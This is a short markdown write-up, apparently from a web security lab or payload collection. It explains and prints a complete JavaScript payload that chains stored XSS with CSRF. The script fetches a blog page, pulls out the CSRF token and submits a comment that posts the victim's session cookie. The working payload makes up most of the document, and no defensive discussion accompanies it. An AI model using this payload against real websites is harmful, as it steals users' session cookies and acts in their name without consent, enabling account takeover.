# XSS-to-CSRF

The code snippet provided demonstrates a **Cross-Site Request Forgery (CSRF)** attack utilizing a **Cross-Site Scripting (XSS)** vulnerability.

By combining a Stored XSS vulnerability to inject the malicious script and a CSRF attack to perform unauthorized actions on the victim's behalf, this code demonstrates a scenario where the victim would post a new comment on a blog with his cookie information in case the Stored XSS payload gets triggered.

```JavaScript
var request = new XMLHttpRequest();
request.responseType = "document"
request.open("GET", "/post?postId=7", true);

request.onload = function(e) {
  var csrf = e.target.response['body'].querySelectorAll('[name="csrf"]')[0].value;
  
  data = "csrf=" + csrf + "&postId=7&comment=" + document.cookie + "&name=victim&email=victim@victim.com&website=http://victim.com"
  
  var request = new XMLHttpRequest();
  request.open("POST", "/post/comment", true);
  request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  request.send(data);
}
request.send();
```
